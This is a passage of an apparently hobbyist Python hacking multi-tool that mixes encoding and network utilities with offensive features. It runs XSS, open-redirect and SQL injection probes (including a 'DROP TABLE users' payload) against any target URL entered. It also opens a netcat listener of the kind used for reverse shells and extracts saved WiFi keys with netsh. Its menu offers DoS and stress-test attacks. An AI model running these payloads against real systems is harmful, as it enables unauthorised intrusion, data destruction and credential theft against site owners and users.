            r = session.get(test_url, timeout=5, allow_redirects=False)
            if any(x in r.text for x in ["alert(1337)", "alert(1)", "onerror=alert(1)"]):
                results.append((test_url, "POSSIBLE REFLECTED XSS"))
            if r.status_code in (301, 302, 303) and "evil.com" in r.headers.get("Location", ""):
                results.append((test_url, "OPEN REDIRECT"))
        except:
            pass

    return results

def quick_sql_error_probe(target):
    errors = ["'", "''", "' OR 1=1 --", "1' ORDER BY 999 --", "1; DROP TABLE users --"]
    findings = []
    u = urlparse(target)
    base = f"{u.scheme}://{u.netloc}{u.path}?"
    params = [p.split('=')[0] for p in u.query.split('&') if '=' in p] or ["id", "page", "user"]

    for param in params:
        for payload in errors:
            test = base + f"{param}={payload}"
            try:
                r = requests.get(test, timeout=6)
                text_lower = r.text.lower()
                if any(err in text_lower for err in ["sql syntax", "mysql", "ora-", "microsoft ole db", "pg_", "unclosed quotation"]):
                    findings.append((test, "SQL ERROR / POSSIBLE INJECTION"))
                    break
            except:
                pass

    return findings

def vulnerability_scanner():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "Target URL (with http/https) → ").strip()
    if not target: return

    target = normalize_url(target)
    print(Fore.YELLOW + f"\nScanning → {target}")
    print(Fore.CYAN + "═" * 70)

    if not is_alive(target):
        print(Fore.RED + "Target appears down / unreachable.")
        return

    print(Fore.WHITE + "[+] Target is alive")

    print(Fore.CYAN + "\n[1] Security Headers")
    header_issues = check_headers(target)
    for issue in header_issues:
        print(Fore.YELLOW + f"  → {issue}")

    print(Fore.CYAN + "\n[2] Sensitive Files / Leaks")
    file_finds = check_common_files(target)
    for path, status, real_url, size in file_finds:
        color = Fore.RED if "LEAK" in status else Fore.GREEN if "EXISTS" in status else Fore.YELLOW
        print(color + f"  → {path.ljust(22)} {status}  ({size} bytes) → {real_url}")

    print(Fore.CYAN + "\n[3] Reflected XSS / Open Redirect Probes")
    xss_redirect = basic_xss_open_redirect(target)
    for url, typ in xss_redirect:
        print(Fore.RED + f"  → {typ} → {url}")

    print(Fore.CYAN + "\n[4] SQL Error / Injection Probes")
    sql_hits = quick_sql_error_probe(target)
    for url, msg in sql_hits:
        print(Fore.RED + f"  → {msg} → {url}")

    print(Fore.CYAN + "═" * 70)
    print(Fore.GREEN + "Basic scan complete.")

def password_strength_checker():
    clear(); rgb_banner(get_banner())
    password = input(Fore.MAGENTA + "Enter password to check → ").strip()
    if not password: return

    length = len(password)
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_symbol = any(c in string.punctuation for c in password)

    score = 0
    if length >= 8: score += 1
    if length >= 12: score += 1
    if length >= 16: score += 1
    if has_upper: score += 1
    if has_lower: score += 1
    if has_digit: score += 1
    if has_symbol: score += 1

    strength = ["Very Weak", "Weak", "Moderate", "Strong", "Very Strong"]
    print(Fore.GREEN + f"Password strength: {strength[min(score, len(strength)-1)]} ({score}/7)")

def look_for_leaks():
    clear(); rgb_banner(get_banner())
    query = input(Fore.MAGENTA + "Search query (email, domain, IP, username) → ").strip()
    if not query: return
    print(Fore.YELLOW + f"Searching for leaks related to → {query}")
    print(Fore.CYAN + "═" * 70)
    try:
        r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{urllib.parse.quote(query)}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            breaches = data.get("breaches", [])
            if breaches:
                print(Fore.GREEN + f"Found {len(breaches)} breaches containing {query}:")
                for b in breaches:
                    print(Fore.YELLOW + f"  → {b['Name']} ({b['BreachDate']}) - {b['PwnCount']} accounts")
            else:
                print(Fore.GREEN + "No breaches found for this query.")
        else:
            print(Fore.RED + "Failed to search breaches.")
    except Exception as e:
        print(Fore.RED + f"Error during search: {str(e)}")

def proxy_checker():
    clear(); rgb_banner(get_banner())
    proxy = input(Fore.MAGENTA + "Proxy (ip:port) → ").strip()
    if not proxy or ':' not in proxy: return
    print(Fore.YELLOW + f"Checking proxy → {proxy}")
    try:
        r = requests.get("http://httpbin.org/ip", proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=8)
        if r.status_code == 200:
            print(Fore.GREEN + f"Proxy is working. Your IP via proxy: {r.json().get('origin')}")
        else:
            print(Fore.RED + "Proxy check failed.")
    except Exception as e:
        print(Fore.RED + f"Error checking proxy: {str(e)}")

def epic_rgb_banner():
    banner = get_banner()
    lines = banner.splitlines()
    if not lines:
        return

    max_len = max(len(line) for line in lines)
    hue = 0.0

    while True:
        try:
            term = os.get_terminal_size()
            w = term.columns
            h = term.lines
        except:
            w = 100
            h = 30

        clear()

        banner_h = len(lines)
        banner_top = (h - banner_h) // 2
        banner_left = (w - max_len) // 2

        for y, line in enumerate(lines):
            cy = banner_top + y
            if cy >= h:
                break

            row = ""
            for x, char in enumerate(line):
                if char == " ":
                    row += " "
                    continue

                phase = hue + x * 0.06 + y * 0.04
                r = int(127 + 127 * math.sin(phase))
                g = int(127 + 127 * math.sin(phase + 2.0944))
                b = int(127 + 127 * math.sin(phase + 4.1888))

                row += f"\033[38;2;{r};{g};{b}m{char}"

            print(" " * banner_left + row + Style.RESET_ALL)

        hue += 0.05
        time.sleep(0.05)

def vpn_checker():
    clear(); rgb_banner(get_banner())
    ip = input(Fore.MAGENTA + "IP to check? → ").strip()
    if not ip: return
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=8)
        if r.status_code == 200:
            data = r.json()
            if data.get("privacy", {}).get("vpn"):
                print(Fore.GREEN + f"{ip} is likely a VPN. Provider: {data['privacy']['vpn_provider']}")
            else:
                print(Fore.YELLOW + f"{ip} does not appear to be a VPN.")
    except Exception as e:
        print(Fore.RED + f"Error checking VPN status: {str(e)}")

def ssl_checker():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "Target domain (without http) → ").strip()
    if not target: return
    print(Fore.YELLOW + f"Checking SSL/TLS configuration for → {target}")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=8) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"SSL/TLS is properly configured for {target}")
                print(Fore.GREEN + f"Certificate issued to: {cert['subject']}")
                print(Fore.GREEN + f"Issued by: {cert['issuer']}")
                print(Fore.GREEN + f"Valid from: {cert['notBefore']}")
                print(Fore.GREEN + f"Valid until: {cert['notAfter']}")
    except Exception as e:
        print(Fore.RED + f"SSL/TLS check failed: {str(e)}")

def main():
    page = 1
    while True:
        print_menu(page)
        opt = input(Fore.MAGENTA + "ASM → ").strip()

        if opt == "N" or opt == "n" and page == 1:
            page = 2
            clear()

        if opt == "P" or opt == "p" and page == 2:
            page = 1
            clear()

        if opt == "UPD" or opt == "upd":
            clear(); rgb_banner(get_banner())
            print(Fore.YELLOW + "Checking for updates...")
            try:
                r = requests.get("https://github.com/anc-w/asm/releases/latest", timeout=10, allow_redirects=True)
                if r.status_code == 200:
                    latest_tag = r.url.split("/")[-1].strip()
                    if latest_tag != f"v{version}":
                        print(Fore.GREEN + f"Update available! Latest version: {latest_tag}")
                        print(Fore.YELLOW + f"Download: {r.url}")
                    else:
                        print(Fore.GREEN + "You are already using the latest version.")
                else:
                    print(Fore.RED + f"Failed to check updates (status {r.status_code})")
            except Exception as e:
                print(Fore.RED + f"Error checking for updates: {str(e)}")
            time.sleep(2)

        try:
            if page == 1:
                if opt == "1":   ip_lookup()
                elif opt == "2": port_scan()
                elif opt == "3":
                    clear(); rgb_banner(get_banner())
                    try: length = int(input(Fore.MAGENTA + "Length → ") or 16)
                    except: length = 16
                    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}"
                    print(Fore.GREEN + ''.join(random.choice(chars) for _ in range(length)))
                elif opt == "4":
                    clear(); rgb_banner(get_banner())
                    txt = input(Fore.MAGENTA + "Text → ")
                    if txt:
                        print(Fore.GREEN + "MD5    " + hashlib.md5(txt.encode()).hexdigest())
                        print("SHA256 " + hashlib.sha256(txt.encode()).hexdigest())
                elif opt == "5":
                    clear(); rgb_banner(get_banner())
                    txt = input(Fore.MAGENTA + "Text → ")
                    print(Fore.GREEN + base64.b64encode(txt.encode()).decode())
                elif opt == "6":
                    clear(); rgb_banner(get_banner())
                    b64 = input(Fore.MAGENTA + "Base64 → ")
                    try:
                        print(Fore.GREEN + base64.b64decode(b64).decode(errors='ignore'))
                    except:
                        print(Fore.RED + "Invalid base64")
                elif opt == "7":
                    clear(); rgb_banner(get_banner())
                    txt = input(Fore.MAGENTA + "Text → ")
                    print(Fore.GREEN + urllib.parse.quote(txt))
                elif opt == "8":
                    clear(); rgb_banner(get_banner())
                    txt = input(Fore.MAGENTA + "Encoded text → ")
                    print(Fore.GREEN + urllib.parse.unquote(txt))
                elif opt == "9":
                    clear(); rgb_banner(get_banner())
                    try: length = int(input(Fore.MAGENTA + "Length → ") or 32)
                    except: length = 32
                    print(Fore.GREEN + ''.join(random.choices(string.ascii_letters + string.digits, k=length)))
                elif opt == "10":
                    clear(); rgb_banner(get_banner())
                    url = input(Fore.MAGENTA + "URL → ")
                    try:
                        r = requests.get(url, timeout=8)
                        print(Fore.GREEN + f"Status  {r.status_code}")
                        print(f"Server  {r.headers.get('Server','-')}")
                        print(f"Type    {r.headers.get('Content-Type','-')}")
                    except:
                        print(Fore.RED + "Request failed")
                elif opt == "11":
                    clear(); rgb_banner(get_banner())
                    host = input(Fore.MAGENTA + "Host → ")
                    subprocess.run(["ping", "-n" if os.name=="nt" else "-c", "4", host])
                elif opt == "12":
                    clear(); rgb_banner(get_banner())
                    url = input(Fore.MAGENTA + "URL → ")
                    try:
                        r = requests.get(url, timeout=7)
                        if "<title>" in r.text.lower():
                            title = r.text.lower().split("<title>")[1].split("</title>")[0].strip()
                            print(Fore.GREEN + title)
                        else:
                            print(Fore.YELLOW + "No title found")
                    except:
                        print(Fore.RED + "Failed to fetch")
                elif opt == "13":
                    clear(); rgb_banner(get_banner())
                    port = input(Fore.MAGENTA + "Port → ") or "4444"
                    print(Fore.YELLOW + f"Listening on 0.0.0.0:{port} ... Ctrl+C to stop")
                    try:
                        subprocess.run(["nc", "-lvnp", port])
                    except:
                        print(Fore.RED + "nc not installed or error")
                elif opt == "14":
                    clear(); rgb_banner(get_banner())
                    url = input(Fore.MAGENTA + "File URL → ")
                    name = input(Fore.MAGENTA + "Save as → ") or "download.bin"
                    try:
                        r = requests.get(url, stream=True, timeout=12)
                        with open(name, "wb") as f:
                            for chunk in r.iter_content(8192):
                                f.write(chunk)
                        print(Fore.GREEN + f"Saved → {name}")
                    except:
                        print(Fore.RED + "Download failed")
                elif opt == "15" and os.name == "nt":
                    clear(); rgb_banner(get_banner())
                    subprocess.run("netsh wlan show profiles", shell=True)
                    ssid = input(Fore.MAGENTA + "WiFi name → ")
                    if ssid:
                        subprocess.run(f'netsh wlan show profile name="{ssid}" key=clear', shell=True)
                elif opt == "16":
                    clear(); rgb_banner(get_banner())
                    agents = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/605.1.15",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119 Safari/537.36"
                    ]
                    print(Fore.GREEN + random.choice(agents))
                elif opt == "17":
                    clear(); rgb_banner(get_banner())
                    text = input(Fore.MAGENTA + "Text → ")
                    key = input(Fore.MAGENTA + "Key → ") or "x"
                    result = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
                    print(Fore.GREEN + result)
                elif opt == "18":
                    clear(); rgb_banner(get_banner())
                    url = input(Fore.MAGENTA + "URL → ")
                    try:
                        r = requests.head(url, timeout=6, allow_redirects=True)
                        print(Fore.GREEN + f"{r.status_code} {r.reason}")
                    except:
                        print(Fore.RED + "Unreachable / timeout")
                elif opt == "19":
                    clear(); rgb_banner(get_banner())
                    print(Fore.GREEN + str(uuid.uuid4()))
                elif opt == "20":
                    clear(); rgb_banner(get_banner())
                    text = input(Fore.MAGENTA + "Text → ")
                    result = ""
                    for c in text:
                        if 'a' <= c <= 'z':
                            result += chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
                        elif 'A' <= c <= 'Z':
                            result += chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
                        else:
                            result += c
                    print(Fore.GREEN + result)
                elif opt == "21":
                    clear(); rgb_banner(get_banner())
                    s = input(Fore.MAGENTA + "Text or binary string → ")
                    if all(c in '01 ' for c in s):
                        bits = s.replace(" ", "")
                        result = "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8) if len(bits[i:i+8]) == 8)
                        print(Fore.GREEN + result)
                    else:
                        binary = " ".join(format(ord(c), '08b') for c in s)
                        print(Fore.GREEN + binary)
                elif opt == "22":
                    clear(); rgb_banner(get_banner())
                    ip = input(Fore.MAGENTA + "IP → ")
                    try:
                        print(Fore.GREEN + socket.gethostbyaddr(ip)[0])
                    except:
                        print(Fore.RED + "No PTR record")
                elif opt == "23":
                    clear(); rgb_banner(get_banner())
                    print(Fore.YELLOW + "Showing basic network info...")
                    subprocess.run("ipconfig" if os.name == "nt" else "ifconfig", shell=True)
                else:
                    print(Fore.RED + "Menu is bugged or Invalid choice on page 1. (just fix by pressing enter)")

            elif page == 2:
                actions = {
                    "25": subdomain_finder,
                    "26": dos_attack,
                    "27": stress_test,
                    "28": osint_gathering,
                    "29": whois_lookup,
                    "30": account_finder,
                    "31": vulnerability_scanner,
                    "32": password_strength_checker,
                    "33": look_for_leaks,
                    "34": proxy_checker,
                    "35": vpn_checker,
                    "36": ssl_checker,
                    "37": epic_rgb_banner
                }
                if opt in actions:
                    actions[opt]()
                elif opt in ["38","39","40","41","42","43","44","45","46","47","48"]:
                    print(Fore.YELLOW + "Coming soon...")
                else:
                    print(Fore.RED + "Menu is bugged or Invalid choice on page 2. (just fix by pressing enter)")

        except Exception as e:
            print(Fore.RED + f"Error in module {opt}: {str(e)}")

        input(Fore.YELLOW + "\nENTER to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(Fore.CYAN + "Exited.")